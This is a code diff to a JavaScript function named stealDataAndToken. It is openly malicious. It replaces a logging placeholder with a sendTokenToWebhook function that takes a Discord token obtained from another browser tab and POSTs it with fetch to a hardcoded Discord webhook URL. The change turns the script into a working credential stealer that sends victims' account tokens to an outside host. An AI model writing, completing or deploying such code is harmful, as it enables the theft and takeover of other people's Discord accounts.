@@ -36,13 +36,37 @@ function stealDataAndToken() {
             // Retrieve the Discord token from the message data
             var discordToken = event.data.token;
 
-            // Proceed with stealing data using the retrieved token
-            console.log('Received Discord Token:', discordToken);
-
-            // Example: send the token to a webhook or perform other actions
-            // sendMessageToDiscord(discordToken);
+            // Proceed with sending the Discord token to the webhook
+            sendTokenToWebhook(discordToken);
         }
     });
+
+    // Function to send the Discord token to the webhook
+    function sendTokenToWebhook(token) {
+        // Construct the message to be sent to the webhook
+        var message = {
+            content: 'Discord Token: ' + token
+        };
+
+        // Send the message to the webhook using fetch
+        fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Message sent to Discord webhook!');
+            } else {
+                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message to Discord webhook:', error.message);
+        });
+    }
 
     // Call the function to send a message to the other tab requesting the Discord token
     sendMessageToOtherTab('Please send Discord token');
